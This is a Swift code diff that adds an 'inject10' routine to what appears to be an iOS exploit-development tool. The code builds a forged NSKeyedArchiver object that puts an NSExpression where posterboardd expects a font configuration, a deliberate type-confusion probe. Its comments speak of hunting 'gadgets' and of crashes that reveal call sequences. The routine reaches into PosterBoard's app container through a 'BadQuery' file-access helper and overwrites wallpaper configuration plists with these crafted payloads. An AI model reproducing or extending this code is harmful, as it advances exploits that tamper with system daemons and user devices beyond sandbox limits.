@@ -2292,6 +2292,113 @@ class SymHandler {
     static var payloadComplicationPFDescProbe:    Data { nska(_PFDescComplicationProxy()) }
     static var payloadComplicationPFPPProbe:      Data { nska(_PFPPComplicationProxy()) }
     static var payloadTitleStyleFontStrProbe:     Data { nska(_TitleStyleFontStrProxy()) }
+    static var payloadTitleStyleFontExprProbe:    Data { nska(_TitleStyleFontExprProxy()) }
+
+    // MARK: - inject10 proxy: NSExpression as full NSCoding object for timeFontConfiguration
+    // When posterboardd calls [expr weight] or [expr timeFontIdentifier] expecting PRPosterSystemTimeFontConfiguration,
+    // ObjC hits doesNotRecognizeSelector: — crash → stack trace reveals exact method call sequence.
+    // If no crash → posterboardd exception-guards font config use; file stays at our size in probe.
+
+    @objc(_PP10TitleFontExprProxy)
+    private class _TitleStyleFontExprProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PRPosterTitleStyleConfiguration") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(false,       forKey: "alternateDateEnabled")
+            coder.encode(Double(0.5), forKey: "contentsLuminence")
+            coder.encode("",          forKey: "groupName")
+            coder.encode(false,       forKey: "isAdaptiveTimeHeightUserConfigured")
+            coder.encode(Double(0),   forKey: "preferredTimeMaxY")
+            coder.encode(Double(0),   forKey: "preferredTimeMaxYLandscape")
+            coder.encode(Int64(0),    forKey: "preferredTitleAlignment")
+            coder.encode(Int64(0),    forKey: "preferredTitleLayout")
+            // NSExpression as a full NSCoding object — NOT a Swift-bridged primitive.
+            // posterboardd decodes this via decodeObjectForKey: → gets live NSExpression.
+            // Any ObjC method call expecting PRPosterSystemTimeFontConfiguration behaviour hits
+            // doesNotRecognizeSelector: and crashes (or is caught, telling us there's a guard).
+            coder.encode(NSExpression(forConstantValue: NSNumber(value: Float(0.5))), forKey: "timeFontConfiguration")
+            coder.encode("",          forKey: "timeNumberingSystem")
+            coder.encode(Int64(0),    forKey: "titleContentStyle")
+            coder.encode(false,       forKey: "userConfigured")
+            coder.encode(Int64(1),    forKey: "version")
+        }
+    }
+
+    // MARK: - inject10: NSExpression as timeFontConfiguration (type confusion probe on clock render path)
+    //         + PFPosterDescriptor as complications (second gadget candidate, not yet tested)
+
+    @discardableResult
+    static func inject10() -> String {
+        var diag = ["=== Inject v10 (type-confusion probe) \(Date()) iOS 26.5 ==="]
+        let fm = FileManager.default
+
+        for fw in ["/System/Library/PrivateFrameworks/PosterKit.framework/PosterKit",
+                   "/System/Library/PrivateFrameworks/WallpaperKit.framework/WallpaperKit"] {
+            dlopen(fw, RTLD_NOW | RTLD_GLOBAL)
+        }
+
+        let fontExprData = payloadTitleStyleFontExprProbe
+        let pfDescData   = payloadComplicationPFDescProbe
+
+        diag.append("probe payloads:")
+        diag.append("  titleStyle NSExpression font: \(fontExprData.count)b")
+        p7DumpNSKAKeys(data: fontExprData, indent: "    ", diag: &diag)
+        diag.append("  PFPosterDescriptor complication: \(pfDescData.count)b")
+        p7DumpNSKAKeys(data: pfDescData,   indent: "    ", diag: &diag)
+
+        let uuid: String
+        do { uuid = try BadQuery.findPosterBoardHash() } catch {
+            diag.append("PB hash: \(error)"); return pbSave(diag)
+        }
+        let container = BadQuery.applicationContainerPath(appHash: uuid)
+        let extBase   = container + "/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"
+        guard let extBaseH = try? BadQuery.consume(path: extBase, create: true) else {
+            diag.append("extBase NOACCESS"); return pbSave(diag)
+        }
+        defer { extBaseH.release() }
+        let allExts = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
+
+        var totalWritten = 0
+        for extName in allExts where extName.contains("WallpaperKit") {
+            for subdir in ["configurations", "staticdescriptors"] {
+                let sdPath = "\(extBase)/\(extName)/\(subdir)"
+                guard let sdH = try? BadQuery.consume(path: sdPath, create: true) else { continue }
+                defer { sdH.release() }
+                let configs = (try? fm.contentsOfDirectory(atPath: sdPath)) ?? []
+                for cfg in configs where !cfg.hasPrefix(".") {
+                    let versPath = "\(sdPath)/\(cfg)/versions"
+                    guard let versH = try? BadQuery.consume(path: versPath, create: true) else { continue }
+                    defer { versH.release() }
+                    let vers = (try? fm.contentsOfDirectory(atPath: versPath)) ?? []
+                    for ver in vers where !ver.hasPrefix(".") {
+                        let vPath = "\(versPath)/\(ver)"
+                        guard let vH = try? BadQuery.consume(path: vPath, create: true) else { continue }
+                        defer { vH.release() }
+                        _ = (try? fm.contentsOfDirectory(atPath: vPath)) ?? []
+
+                        let probeFiles: [(String, String, Data)] = [
+                            ("titleStyle",   "com.apple.posterkit.provider.instance.titleStyleConfiguration.plist",  fontExprData),
+                            ("rendering",    "com.apple.posterkit.provider.instance.renderingConfiguration.plist",   payloadRendering),
+                            ("complication", "com.apple.posterkit.provider.instance.complicationLayout.plist",       pfDescData),
+                            ("quickActions", "com.apple.posterkit.provider.instance.quickActions.plist",             payloadQuickActions),
+                        ]
+                        diag.append("\n\(extName.prefix(22))/\(subdir.prefix(6))/\(cfg.prefix(8))/v\(ver):")
+                        for (name, fileName, payload) in probeFiles {
+                            let path = "\(vPath)/\(fileName)"
+                            if let fH = try? BadQuery.consume(path: path, create: true) { fH.release() }
+                            let wrote = fm.createFile(atPath: path, contents: payload, attributes: nil)
+                                || ((try? payload.write(to: URL(fileURLWithPath: path), options: [])) != nil)
+                            diag.append("  \(name): \(wrote ? "WRITTEN \(payload.count)b" : "FAIL")")
+                            if wrote { totalWritten += 1 }
+                        }
+                    }
+                }
+            }
+        }
+        diag.append("\ntotal written: \(totalWritten)")
+        return pbSave(diag)
+    }
 
     // MARK: - inject9: gadget probe — NSExpression / PFPosterDescriptor / PFPosterPath as complications
     //         Also probes timeFontConfiguration type restriction (NSString vs PRPosterSystemTimeFontConfiguration)
